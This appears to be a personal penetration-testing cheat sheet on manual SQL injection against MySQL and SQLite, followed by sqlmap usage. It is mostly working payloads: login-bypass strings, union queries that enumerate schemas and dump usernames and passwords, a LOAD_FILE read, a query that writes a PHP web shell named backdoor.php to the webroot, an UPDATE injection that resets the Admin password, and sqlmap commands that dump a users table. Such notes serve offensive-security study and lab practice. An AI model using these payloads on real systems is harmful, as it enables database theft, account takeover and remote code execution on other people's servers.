# Manual SQL Injection
## SQLI steps
1. Find the pattern (beginning and ending) to complete and execute the SQL request
2. Begin the exploitation only using ORDER BY and UNION SELECT statements to show columns of the table
3. You need to know which DBMS is behind
	- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification
4. Create the payload you need to exploit based on the DBMS 
	- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

## Bypass login panel using SQLI (Ex: MySQL)
```sql
# Example : 
SELECT username, password FROM users WHERE username = '1' OR 1=1 -- - AND password = "toto";

# Payloads
# If the parameter to attack is a int type
1 OR 1=1 -- -
# If the parameter to attack is a string type
1' OR 1=1 -- -
```
```sql
# Other way
' OR 1=1 LIMIT 1; #
```
Note about MySQL comments : 
- The reason for using  -- - instead of -- is primarily because of how MySQL handles the double-dash comment style.
	- More details here: [https://blog.raw.pm/en/sql-injection-mysql-comment/](https://blog.raw.pm/en/sql-injection-mysql-comment/)

## Abuse a DBMS (ex: MySQL) using a Union Based statement
1) The first thing to do in union based statement is to determine the number of columns
```sql
# Example :
SELECT username, password FROM users WHERE id = <paylaod>

# USING ORDER BY
# Error :  Unknown column '5' in 'order clause' 
' ORDER BY 5 -- -
# Error :  Unknown column '4' in 'order clause' 
' ORDER BY 4 -- -
# No error : there is 3 columns in the table
' ORDER BY 3 -- -

# USING ORDER BY
# Error : Unknown column '4' in 'group statement'
' GROUP BY 4 -- -
# No error : there is 3 columns in the table
' GROUP BY 3 -- -
```

2) Determine which tables columns are showed
```sql
# We know they are three columns inside the table
' UNION SELECT 1,2,3 -- -
```
![[Pasted image 20210707104318.png]]

3) Inject SQL queries inside the vulnerable parameter
```sql
# We can inject malicious code
' UNION SELECT 1,@@version,current_user() -- -
```
![[Pasted image 20210707104656.png]]

4) Retrieve the database information 
```sql 
# Paylaods used for a MYSQL DBMS
# Extract the databases
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c),4 FROM information_schema.schemata -- -
# Extract the tables
# Warning : do NOT FORGOT the quotes
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,table_name,0x7C),4 FROM information_schema.tables WHERE table_schema="security" -- -
# Extract the columns' names
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,column_name,0x7C),4 FROM information_schema.columns WHERE table_name="users" -- -
# Extract data from the tables
' UNION SELECT 1,2,GROUP_CONCAT(0x7c,username,0x7C,password,0x7C),4 FROM <database_name>.<table_name> -- -
```

## Abuse a DBMS (MySQL) to get code execution
Depends on the :
	- OS
	- Service privileges
	- File permissions
```sql
# Read a file from the filesystem
id = 1 UNION SELECT 1,2 LOAD_FILE('C:/Windows/System32/drivers/etc/hosts')

# Write a file to the webroot and access it using the browser
UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```


## Abuse a DBMS (ex: SQLite) UPDATE statement (You need to know the columns names)
```sql
# Example : 
UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>

# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='


# Don't forget to use parentheses and the "GROUP_CONCAT" command
# Extract table names (Sqlite)
',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

# Extract column names (Sqlite)
',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable'),email='

# Get information from the table (Sqlite)
# Sqlite -> the || operator is "concatenate"
',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='

# Update the field (Sqlite)
', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -
```

# SQLMAP
### GET Request:
Link:
- https://www.binarytides.com/sqlmap-hacking-tutorial/

### Command:
```bash
python sqlmap.py -u "http://www.site.com/section.php?id=51"
python sqlmap.py -u "http://www.sitemap.com/section.php?id=51" --dbs
python sqlmap.py -u "http://www.site.com/section.php?id=51" --tables -D safecosmetics
python sqlmap.py -u "http://www.site.com/section.php?id=51" --columns -D safecosmetics -T users
python sqlmap.py -u "http://www.site.com/section.php?id=51" --dump -D safecosmetics -T users
```

### POST Request:
Link:
- https://hackertarget.com/sqlmap-post-request-injection/

### Command:
```bash
sqlmap.py -r search-test.txt -p tfUPassdge
sqlmap -u "http://10.11.1.252:8000/login_action.php" --method POST --data "username=test&password=test" -p "username" -D "timeclock" --tables
```
